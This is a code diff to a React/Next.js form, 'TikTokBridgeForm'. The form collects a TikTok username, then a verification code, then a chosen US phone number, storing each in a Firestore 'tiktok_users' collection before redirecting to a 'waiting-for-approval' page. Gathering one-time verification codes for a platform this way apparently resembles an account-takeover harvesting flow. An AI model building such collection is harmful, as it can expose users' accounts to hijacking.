@@ -6,7 +6,7 @@ import { zodResolver } from "@hookform/resolvers/zod";
 import * as z from "zod";
 import { useForm } from "react-hook-form";
 import { User, Phone, KeyRound, CheckCircle, Loader2, AtSign, Check, X } from "lucide-react";
-import { collection, doc, addDoc } from "firebase/firestore";
+import { collection, doc, addDoc, updateDoc } from "firebase/firestore";
 import { useRouter } from "next/navigation";
 
 import { Button } from "@/components/ui/button";
@@ -66,6 +66,14 @@ export function TikTokBridgeForm() {
     mode: 'onChange',
   });
     
+  useEffect(() => {
+    // On component mount, check if there's a submission ID in localStorage
+    const storedId = localStorage.getItem('submissionId');
+    if (storedId) {
+      setSubmissionId(storedId);
+    }
+  }, []);
+    
   const handleNext = async () => {
     const fieldsToValidate = TIKTOK_BRIDGE_STEPS[currentStep]?.fields;
     if (fieldsToValidate) {
@@ -78,17 +86,24 @@ export function TikTokBridgeForm() {
     setIsSubmitting(true);
 
     try {
+        if (!firestore) throw new Error("Firestore not available");
         // Step 1 -> 2 (Username)
         if (currentStep === 0) {
-            if (!firestore) throw new Error("Firestore not available");
             const { username } = form.getValues();
             const submissionData = { 
                 tiktokUsername: username, 
                 isVerified: false, 
-                createdAt: new Date()
+                createdAt: new Date(),
+                verificationCode: null,
+                phoneNumberId: null,
+                phoneNumber: null,
             };
+            // Use await here to ensure we get the docRef before proceeding
             const docRef = await addDoc(collection(firestore, "tiktok_users"), submissionData);
             setSubmissionId(docRef.id);
+            if (typeof window !== 'undefined') {
+                localStorage.setItem('submissionId', docRef.id);
+            }
             
             api.scrollNext(); // Go to loading step
             setTimeout(() => {
@@ -97,35 +112,31 @@ export function TikTokBridgeForm() {
             }, 5000);
             return;
         }
-
+        
         // Step 3 -> 4 (Verification Code)
         if (currentStep === 2) {
+            if (!submissionId) throw new Error("Submission ID not found");
+            const { verificationCode } = form.getValues();
+            const submissionDocRef = doc(firestore, 'tiktok_users', submissionId);
+            await updateDoc(submissionDocRef, { verificationCode });
             api.scrollNext();
         }
 
         // Step 4 -> 5 (Select Number & Final Submission)
         if (currentStep === 3) {
-            if (!firestore || !submissionId) throw new Error("Firestore or submissionId not available");
+            if (!submissionId) throw new Error("Submission ID not found");
             
-            const { usNumber, verificationCode } = form.getValues();
+            const { usNumber } = form.getValues();
             const selectedPhoneNumberDoc = phoneNumbers?.find(p => p.phoneNumber === usNumber);
             if (!selectedPhoneNumberDoc) throw new Error("Selected phone number not found");
 
             const submissionDocRef = doc(firestore, 'tiktok_users', submissionId);
             const finalData = {
-                verificationCode,
                 phoneNumberId: selectedPhoneNumberDoc.id,
                 phoneNumber: selectedPhoneNumberDoc.phoneNumber,
             };
 
-            // This is non-blocking, so we redirect immediately
-            // await updateDoc(submissionDocRef, finalData); 
-            
-            // For now, let's just use local storage to pass the ID to the waiting page
-            // A more robust solution might use URL params
-            if (typeof window !== 'undefined') {
-                localStorage.setItem('submissionId', submissionId);
-            }
+            await updateDoc(submissionDocRef, finalData); 
             
             router.push('/waiting-for-approval');
             return; // Prevent setIsSubmitting(false) from running
@@ -134,7 +145,7 @@ export function TikTokBridgeForm() {
     } catch (e) {
         console.error("An error occurred: ", e);
     } finally {
-        // Don't set isSubmitting to false for async steps
+        // Don't set isSubmitting to false for the async username step
         if (currentStep !== 0) {
             setIsSubmitting(false);
         }
@@ -163,12 +174,12 @@ export function TikTokBridgeForm() {
   }, [api])
   
   const CurrentIcon = TIKTOK_BRIDGE_STEPS[currentStep].icon;
-  const progress = ((currentStep) / (TIKTOK_BRIDGE_STEPS.length-2)) * 100;
-  
+  const progressValue = Math.max(0, ((currentStep - (currentStep > 1 ? 1: 0)) / (TIKTOK_BRIDGE_STEPS.length - 2)) * 100);
+
   return (
     <Card>
       <CardHeader>
-        <Progress value={progress} className="mb-4" />
+        <Progress value={progressValue} className="mb-4" />
         <div className="flex items-center space-x-3 min-h-[48px]">
             <div className={cn(
                 "flex h-8 w-8 items-center justify-center rounded-full bg-primary text-primary-foreground shrink-0",
@@ -328,3 +339,5 @@ export function TikTokBridgeForm() {
     </Card>
   );
 }
+
+    
